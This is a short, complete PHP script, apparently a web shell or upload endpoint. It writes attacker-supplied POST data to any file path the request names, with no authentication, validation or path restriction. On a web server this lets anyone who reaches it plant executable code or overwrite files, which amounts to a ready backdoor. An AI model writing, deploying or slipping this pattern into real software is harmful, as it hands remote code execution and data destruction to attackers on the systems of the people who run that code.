<?php

	$file = fopen($_POST['file'], "w");
	fwrite($file, $_POST['data']);
	fclose($file);

?>